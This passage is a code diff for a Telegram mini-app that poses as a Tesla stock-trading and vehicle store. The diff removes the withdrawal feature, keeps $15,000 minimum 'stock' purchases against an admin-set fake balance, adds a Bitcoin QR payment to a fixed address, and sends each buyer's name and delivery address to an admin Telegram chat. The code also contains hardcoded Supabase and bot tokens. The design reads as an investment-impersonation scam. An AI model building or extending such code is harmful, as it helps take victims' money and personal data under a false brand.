         const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVleHNtcXNwbGhkeGtwdXF3em9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODM0MjQxMjEsImV4cCI6MjA5OTAwMDEyMX0.EuFDle4MAmZSAh08ygL2NFMjGy01Ga84IOhdnA08KEE";
-        
         const TELEGRAM_BOT_TOKEN = "8979519467:AAHDdSExQdeQY9cXIRhr0I3nt961m-6d32I"; 
-        const ADMIN_TELEGRAM_CHAT_ID = "7564351203"; 
+        const ADMIN_CHAT_ID = "7564351203"; 
 
         const _supabase = window.supabase?.createClient(SUPABASE_URL, SUPABASE_KEY);
         const tg = window.Telegram?.WebApp;
         
         let currentUser = null;
-        let activeOrderAsset = null;
+        let selectedProduct = null;
+        let qrCodeInstance = null;
 
-        if (tg) {
-            tg.expand();
-            tg.ready();
-        }
+        // HAMBURGER DRAWER ACTION LISTENERS
+        const menuToggle = document.getElementById('menuToggle');
+        const sideNav = document.getElementById('sideNav');
+
+        menuToggle.addEventListener('click', (e) => {
+            e.stopPropagation();
+            sideNav.classList.toggle('open');
+        });
+
+        document.addEventListener('click', (e) => {
+            if (!sideNav.contains(e.target) && !menuToggle.contains(e.target)) {
+                sideNav.classList.remove('open');
+            }
+        });
 
         // VIEW MATRIX HANDLING
         function switchView(viewId, element) {
             document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
             document.getElementById(viewId).classList.add('active');
             
-            if (element) {
-                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-                element.classList.add('active');
-            }
-            if (viewId === 'view-withdraw') evaluateWithdrawalAccess();
+            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+            if (element) element.classList.add('active');
+            
+            sideNav.classList.remove('open');
+            if (viewId === 'view-dashboard') loadTradingViewChart();
         }
 
-        // DISINVESTMENT WITHDRAW MODULE ENGINE
-        function evaluateWithdrawalAccess() {
-            const currentBal = currentUser ? parseFloat(currentUser.Balance || 0) : 0;
-            const blockNotice = document.getElementById('withdraw-restricted-notice');
-            const actionForm = document.getElementById('withdraw-active-form');
+        // STORE DEPLOYMENT SELECTIONS ENGINE
+        function openOrderModal(name, cost) {
+            selectedProduct = { name: name, cost: cost };
+            document.getElementById('order-title-element').innerText = `ACQUISITION PROFILE: ${name.toUpperCase()}`;
+            document.getElementById('order-form-block').style.display = 'block';
+            document.getElementById('products-catalog-container').style.display = 'none';
+            document.getElementById('order-form-block').scrollIntoView({ behavior: 'smooth' });
+        }
 
-            if (currentBal >= 10000) {
-                blockNotice.style.display = 'none';
-                actionForm.style.display = 'block';
+        function togglePaymentSelectionUI() {
+            const mode = document.getElementById('payment-mode-selection').value;
+            const qrBlock = document.getElementById('qr-gateway-display-box');
+            
+            if (mode === 'qr') {
+                qrBlock.style.display = 'block';
+                document.getElementById('qrcode-target').innerHTML = "";
+                qrCodeInstance = new QRCode(document.getElementById("qrcode-target"), {
+                    text: "bitcoin:bc1q8egcghdp55c4p54rnw7v4zjwupme7m3se509tw?amount=" + (selectedProduct.cost / 60000).toFixed(4),
+                    width: 160,
+                    height: 160,
+                    colorDark : "#000000",
+                    colorLight : "#ffffff"
+                });
             } else {
-                blockNotice.style.display = 'block';
-                actionForm.style.display = 'none';
+                qrBlock.style.display = 'none';
             }
         }
 
-        function calculateWithdrawalFees() {
-            const amt = parseFloat(document.getElementById('withdraw-amount').value) || 0;
-            const tax = amt * 0.05;
-            
-            let variableFee = 0;
-            if (amt > 0) {
-                variableFee = amt < 5000 ? 50 : amt < 15000 ? 150 : 350;
-            }
-
-            const netPayout = amt - (tax + variableFee);
-
-            document.getElementById('tax-display').innerText = `$${tax.toFixed(2)}`;
-            document.getElementById('fee-display').innerText = `$${variableFee.toFixed(2)}`;
-            document.getElementById('net-payout-display').innerText = netPayout > 0 ? `$${netPayout.toFixed(2)}` : '$0.00';
-        }
-
-        async function executeWithdrawalRequest() {
-            const amt = parseFloat(document.getElementById('withdraw-amount').value) || 0;
-            const dest = document.getElementById('withdraw-destination').value.trim();
+        async function submitVehicleOrder() {
+            const address = document.getElementById('order-address-input').value.trim();
+            const payMode = document.getElementById('payment-mode-selection').value;
             const currentBal = currentUser ? parseFloat(currentUser.Balance || 0) : 0;
 
-            if (amt < 1) { alert("Please supply a functional disinvestment value."); return; }
-            if (!dest) { alert("Please state your destination collection clearance endpoint."); return; }
-            if (amt > currentBal) { alert("Operation rejected: Amount requested exceeds present wallet limits."); return; }
+            if (!address) { alert("Please provide a valid physical dispatch delivery destination address profile."); return; }
 
-            const tax = amt * 0.05;
-            const variableFee = amt < 5000 ? 50 : amt < 15000 ? 150 : 350;
-            const netPayout = amt - (tax + variableFee);
-
-            const newBalance = currentBal - amt;
-
-            if (_supabase) {
-                const { error } = await _supabase
-                    .from('Users')
-                    .update({ Balance: newBalance })
-                    .eq('telegram_id', currentUser.telegram_id);
-
-                if (error) {
-                    alert("Database out-ramp error: " + error.message);
+            if (payMode === 'balance') {
+                if (currentBal < selectedProduct.cost) {
+                    alert("Operation Terminated: Internal portfolio asset values are lower than the vehicle sticker price requirements.");
                     return;
                 }
-                
-                currentUser.Balance = newBalance;
-                document.getElementById('balance').innerText = `$${Number(newBalance).toLocaleString()}`;
-                
-                const telegramPayload = `📥 WITHDRAWAL FILE INITIATED\n\nUser Profile: @${currentUser.Name}\nID Ref Number: ${currentUser.telegram_id}\nGross Value Out: $${amt.toLocaleString()}\n5% Tax Withheld: $${tax.toFixed(2)}\nProcessing Markup Fee: $${variableFee.toFixed(2)}\nNet Disbursed: $${netPayout.toFixed(2)}\nAccount Clearance Profile Destination: ${dest}`;
-                await broadcastToTelegramAdmin(telegramPayload);
-
-                alert(`Clearance Settlement initialized! $${amt.toLocaleString()} subtracted cleanly. Network processing alert emitted.`);
-                document.getElementById('withdraw-amount').value = '';
-                document.getElementById('withdraw-destination').value = '';
-                calculateWithdrawalFees();
-                evaluateWithdrawalAccess();
-            }
-        }
-
-        // STOCK ACQUISITION CONTROL MATRICES WITH 3-HOUR TIME HOVER LIMITS
-        async function executeStockPurchase() {
-            const purchaseAmount = parseFloat(document.getElementById('stock-purchase-amount').value) || 0;
-            const currentBal = currentUser ? parseFloat(currentUser.Balance || 0) : 0;
-
-            if (purchaseAmount < 15000) {
-                alert("Operation Rejected: Asset acquisition channels demand a minimum investment factor of $15,000.");
-                return;
-            }
-
-            if (purchaseAmount > currentBal) {
-                alert("Operation Rejected: Insufficient platform funds for asset deployment.");
-                return;
-            }
-
-            const currentTimeMillis = Date.now();
-            const threeHoursInMillis = 3 * 60 * 60 * 1000;
-            
-            let rollingSum = 0;
-            if (currentUser.last_purchase_window) {
-                try {
-                    const trackingObject = JSON.parse(currentUser.last_purchase_window);
-                    if (currentTimeMillis - trackingObject.windowStart < threeHoursInMillis) {
-                        rollingSum = parseFloat(trackingObject.totalSpent || 0);
-                    } else {
-                        rollingSum = 0;
-                    }
-                } catch(e) { rollingSum = 0; }
-            }
-
-            if (rollingSum + purchaseAmount > 30000) {
-                const availableAllowance = 30000 - rollingSum;
-                alert(`Operation Restricted: Stock purchase limit exceeded. You can only acquire an additional $${availableAllowance.toLocaleString()} worth of assets before your 3-hour structural cooldown reset.`);
-                return;
-            }
-
-            const updatedRollingSum = rollingSum + purchaseAmount;
-            const newWindowPayload = JSON.stringify({
-                windowStart: currentUser.last_purchase_window ? JSON.parse(currentUser.last_purchase_window).windowStart || currentTimeMillis : currentTimeMillis,
-                totalSpent: updatedRollingSum
-            });
-
-            const newBalance = currentBal - purchaseAmount;
-
-            if (_supabase) {
-                const { error } = await _supabase
-                    .from('Users')
-                    .update({ Balance: newBalance, last_purchase_window: newWindowPayload })
-                    .eq('telegram_id', currentUser.telegram_id);
-
-                if (error) {
-                    alert("Transaction matrix mapping failure: " + error.message);
-                    return;
-                }
-
-                currentUser.Balance = newBalance;
-                currentUser.last_purchase_window = newWindowPayload;
-                document.getElementById('balance').innerText = `$${Number(newBalance).toLocaleString()}`;
-
-                const telegramPayload = `📈 STOCK PORTFOLIO ACQUISITION\n\nUser: @${currentUser.Name}\nID Ref Number: ${currentUser.telegram_id}\nValue Purchased: $${purchaseAmount.toLocaleString()}\nTotal 3-Hour Cumulative Window Volume: $${updatedRollingSum.toLocaleString()}/$30,000`;
-                await broadcastToTelegramAdmin(telegramPayload);
-
-                alert(`Asset Acquisition Completed! $${purchaseAmount.toLocaleString()} deployed smoothly into your system profile portfolio.`);
-                document.getElementById('stock-purchase-amount').value = '';
-            }
-        }
-
-        // TESLA LOGISTICS STORE FRONT-END ENGINE
-        function initiateVehicleOrder(vehicleName, price) {
-            activeOrderAsset = { name: vehicleName, cost: price };
-            document.getElementById('order-form-title').innerText = `DEPLOYMENT FORM: ${vehicleName.toUpperCase()}`;
-            document.getElementById('order-form-container').style.display = 'block';
-            document.getElementById('purchase-slip').style.display = 'none';
-            document.getElementById('order-form-container').scrollIntoView({ behavior: 'smooth' });
-        }
-
-        function adjustOrderPaymentUI() {
-            const method = document.getElementById('order-payment-method').value;
-            document.getElementById('order-qr-block').style.display = (method === 'qr') ? 'block' : 'none';
-        }
-
-        async function submitVehiclePurchase() {
-            const loc = document.getElementById('order-shipping-location').value.trim();
-            const payMethod = document.getElementById('order-payment-method').value;
-            const currentBal = currentUser ? parseFloat(currentUser.Balance || 0) : 0;
-
-            if (!loc) { alert("Please input a verified delivery address destination location coordinate."); return; }
-
-            if (payMethod === 'balance') {
-                if (currentBal < activeOrderAsset.cost) {
-                    alert("Operation Denied: Insufficient interface balance framework to complete direct factory clearings.");
-                    return;
-                }
-
-                const newBalance = currentBal - activeOrderAsset.cost;
+                const updatedBalance = currentBal - selectedProduct.cost;
                 if (_supabase) {
-                    const { error } = await _supabase
-                        .from('Users')
-                        .update({ Balance: newBalance })
-                        .eq('telegram_id', currentUser.telegram_id);
-
-                    if (error) { alert("Store sync dropped: " + error.message); return; }
-                    currentUser.Balance = newBalance;
-                    document.getElementById('balance').innerText = `$${Number(newBalance).toLocaleString()}`;
+                    await _supabase.from('Users').update({ Balance: updatedBalance }).eq('telegram_id', currentUser.telegram_id);
+                    currentUser.Balance = updatedBalance;
+                    document.getElementById('balance').innerText = `$${Number(updatedBalance).toLocaleString()}`;
                 }
             }
 
-            const randomOrderId = "TSLA-" + Math.floor(10000000 + Math.random() * 90000000);
-            const timeString = new Date().toLocaleString();
-            const buyerIdStr = currentUser ? currentUser.telegram_id : "12345678";
+            const alertText = `🚘 DIRECT LOGISTICS DISPATCH INITIATED\n\nVehicle Fleet Model: ${selectedProduct.name}\nResolution Node: ${payMode.toUpperCase()}\nUser Identity: @${currentUser ? currentUser.Name : 'Guest'}\nShipping Coordinate Target:\n👉 ${address}\nTransaction Valuation Clear: $${selectedProduct.cost.toLocaleString()}`;
+            await emitTelemetryLog(alertText);
 
-            document.getElementById('slip-order-id').innerText = randomOrderId;
-            document.getElementById('slip-time').innerText = timeString;
-            document.getElementById('slip-buyer-id').innerText = buyerIdStr;
-            document.getElementById('slip-item-name').innerText = activeOrderAsset.name.toUpperCase();
-            document.getElementById('slip-pay-method').innerText = payMethod === 'balance' ? "INTERNAL PORTFOLIO BALANCE CLEARING" : "SECURE REVENUE QR LINK VERIFICATION";
-            document.getElementById('slip-location').innerText = loc;
-            document.getElementById('slip-price').innerText = `$${activeOrderAsset.cost.toLocaleString()}.00`;
-
-            document.getElementById('order-form-container').style.display = 'none';
-            document.getElementById('purchase-slip').style.display = 'block';
-            document.getElementById('purchase-slip').scrollIntoView({ behavior: 'smooth' });
-
-            const adminNotifyPayload = `🚘 TESLA PREMIUM FLEET ORDER PLACED\n\nOrder Registry Reference: ${randomOrderId}\nVehicle Class: ${activeOrderAsset.name}\nSettlement Engine: ${payMethod.toUpperCase()}\nUser Tracking Profile: @${currentUser ? currentUser.Name : 'Guest'}\nBuyer Telegram ID: ${buyerIdStr}\nAuthorized Delivery Logistics Destination Address:\n👉 ${loc}\nTotal Cost Value: $${activeOrderAsset.cost.toLocaleString()}`;
-            await broadcastToTelegramAdmin(adminNotifyPayload);
-
-            alert("Tesla direct clearing initialized! Your asset acquisition processing slip has been stamped into code configuration arrays below.");
-            document.getElementById('order-shipping-location').value = '';
+            alert("Order mapping dispatched into logistical chains! Resetting catalog views.");
+            document.getElementById('order-address-input').value = "";
+            document.getElementById('order-form-block').style.display = 'none';
+            document.getElementById('products-catalog-container').style.display = 'block';
         }
 
-        // TELEGRAM BOT TELEMETRY OUTBOUND ENGINE WIRELINE
-        async function broadcastToTelegramAdmin(message) {
-            if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) return;
+        // OUTBOUND ROBOTIC TELEMETRY SIGNAL CHANNELS
+        async function emitTelemetryLog(msg) {
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: ADMIN_TELEGRAM_CHAT_ID, text: message })
+                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg })
                 });
-            } catch (e) { console.error("Telemetry line bypassed.", e); }
+            } catch(e) { console.error("Signal loss occurred.", e); }
         }
 
-        // BACKEND DESKTOP MANAGER INTERFACE SYNC
-        async function runApplicationWorkspace() {
-            try {
-                let telegramId = tg?.initDataUnsafe?.user?.id?.toString() || "12345678";
-                let username = tg?.initDataUnsafe?.user?.username || "NeuralLinkTrader";
+        // ASSET STAKE TRANSACTIONS PIPELINE
+        async function executeStockPurchase() {
+            const amt = parseFloat(document.getElementById('stock-purchase-amount').value) || 0;
+            const currentBal = currentUser ? parseFloat(currentUser.Balance || 0) : 0;
 
-                if (telegramId === ADMIN_TELEGRAM_CHAT_ID || username.toLowerCase() === "officialxsupport") {
-                    document.getElementById('admin-nav').style.display = 'flex';
-                }
+            if (amt < 15000) { alert("Minimum execution rules limit baseline asset values to $15,000."); return; }
+            if (amt > currentBal) { alert("Operational rejection: Balance values lack depth to cover execution values."); return; }
 
-                if (_supabase) {
-                    let { data: user, error } = await _supabase
-                        .from('Users')
-                        .select('*')
-                        .eq('telegram_id', telegramId)
-                        .maybeSingle();
-
-                    if (!user) {
-                        const { data: newUser } = await _supabase
-                            .from('Users')
-                            .insert([{ telegram_id: telegramId, Name: username, Balance: 0, last_purchase_window: null }])
-                            .select()
-                            .maybeSingle();
-                        user = newUser;
-                    }
-
-                    currentUser = user;
-                    if (user) {
-                        document.getElementById('user-display').innerText = `@${username.toUpperCase()}`;
-                        document.getElementById('balance').innerText = `$${Number(user.Balance || 0).toLocaleString()}`;
-                    }
-                }
-            } catch (err) {
-                console.error("Pipeline initialization event failed:", err);
-            } finally {
-                setTimeout(() => {
-                    const scr = document.getElementById('loading-screen');
-                    if (scr) { scr.style.opacity = '0'; setTimeout(() => scr.style.display = 'none', 400); }
-                }, 800);
-                loadTradingViewChart();
+            const updatedBal = currentBal - amt;
+            if (_supabase) {
+                await _supabase.from('Users').update({ Balance: updatedBal }).eq('telegram_id', currentUser.telegram_id);
+                currentUser.Balance = updatedBal;
+                document.getElementById('balance').innerText = `$${Number(updatedBal).toLocaleString()}`;
+                
+                await emitTelemetryLog(`📈 STAKE LEDGER REFRESH\n\nProfile Account: @${currentUser.Name}\nAcquisition Total: $${amt.toLocaleString()}\nResidual Reserves: $${updatedBal.toLocaleString()}`);
+                alert("Assets deployed safely within internal tracking databases.");
+                document.getElementById('stock-purchase-amount').value = "";
             }
         }
 
-        // INJECT DYNAMIC REAL-TIME TRADING VIEW ADVANCED GRAPHICS ENGINE
-        function loadTradingViewChart() {
-            if (window.TradingView) return;
-            const script = document.createElement('script');
-            script.type = 'text/javascript';
-            script.src = 'https://s3.tradingview.com/tv.js';
-            script.onload = () => {
-                new TradingView.widget({
-                    "width": "100%",
-                    "height": "100%",
-                    "symbol": "NASDAQ:TSLA",
-                    "interval": "D",
-                    "timezone": "Etc/UTC",
-                    "theme": "dark",
-                    "style": "1",
-                    "locale": "en",
-                    "enable_publishing": false,
-                    "hide_side_toolbar": true,
-                    "allow_symbol_change": true,
-                    "container_id": "tradingview_chart"
-                });
-            };
-            document.head.appendChild(script);
+        // ADMINISTRATIVE BACKDOOR INTERFACE COMPILATION
+        async function adminUpdateBalance() {
+            const tId = document.getElementById('admin-target-id').value.trim();
+            const tVal = parseFloat(document.getElementById('admin-target-balance').value);
+
+            if (!tId || isNaN(tVal)) { alert("Supply exact definitions."); return; }
+            if (_supabase) {
+                const { error } = await _supabase.from('Users').update({ Balance: tVal }).eq('telegram_id', tId);
+                if (error) alert("Database rejection: " + error.message);
+                else {
+                    alert(`Sync completed. Target node balance updated explicitly to $${tVal.toLocaleString()}.`);
+                    if (currentUser && currentUser.telegram_id === tId) {
+                        currentUser.Balance = tVal;
+                        document.getElementById('balance').innerText = `$${tVal.toLocaleString()}`;
+                    }
+                }
+            }
         }
 
-        // ADMINISTRATIVE PORTAL CORE FUNCTIONS
-        async function adminUpdateBalance() {
-            const targetId = document.getElementById('admin-target-id').value.trim();
-            const targetBal = parseFloat(document.getElementById('admin-target-balance').value);
-
-            if (!targetId || isNaN(targetBal)) { alert("Enter precise spec definitions."); return; }
+        // INITIAL SYSTEM CONTEXT APP MOUNTING PROCEDURES
+        async function bootstrapApplicationRuntime() {
+            if (tg) { tg.expand(); tg.ready(); }
+            let trackingTelegramId = tg?.initDataUnsafe?.user?.id?.toString() || "12345678";
+            let defaultName = tg?.initDataUnsafe?.user?.username || "NeuralLinkTrader";
 
             if (_supabase) {
-                const { error } = await _supabase
-                    .from('Users')
-                    .update({ Balance: targetBal })
-                    .eq('telegram_id', targetId);
-
-                if (error) { alert("Adjustment rejected: " + error.message); } 
-                else {
-                    alert(`Portfolio adjusted. Target [ID: ${targetId}] modified cleanly to $${targetBal.toLocaleString()}.`);
-                    if (currentUser && currentUser.telegram_id === targetId) {
-                        currentUser.Balance = targetBal;
-                        document.getElementById('balance').innerText = `$${targetBal.toLocaleString()}`;
-                        evaluateWithdrawalAccess();
-                    }
+                let { data: accountData } = await _supabase.from('Users').select('*').eq('telegram_id', trackingTelegramId).maybeSingle();
+                if (!accountData) {
+                    const { data: generatedAccount } = await _supabase.from('Users').insert([{ telegram_id: trackingTelegramId, Name: defaultName, Balance: 0 }]).select().maybeSingle();
+                    accountData = generatedAccount;
                 }
+                currentUser = accountData;
+                if (accountData) {
+                    document.getElementById('user-display').innerText = `@${accountData.Name.toUpperCase()}`;
+                    document.getElementById('balance').innerText = `$${Number(accountData.Balance || 0).toLocaleString()}`;
+                }
+            }
+            loadTradingViewChart();
+        }
+
+        function loadTradingViewChart() {
+            if (window.TradingView && document.getElementById('tradingview_chart')) {
+                new TradingView.widget({
+                    "width": "100%", "height": "100%", "symbol": "NASDAQ:TSLA", "interval": "D",
+                    "theme": "dark", "style": "1", "locale": "en", "container_id": "tradingview_chart",
+                    "hide_side_toolbar": true, "enable_publishing": false
+                });
             }
         }
 
-        window.addEventListener('DOMContentLoaded', runApplicationWorkspace);
+        window.addEventListener('DOMContentLoaded', bootstrapApplicationRuntime);
     </script>
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
 </body>
 </html>
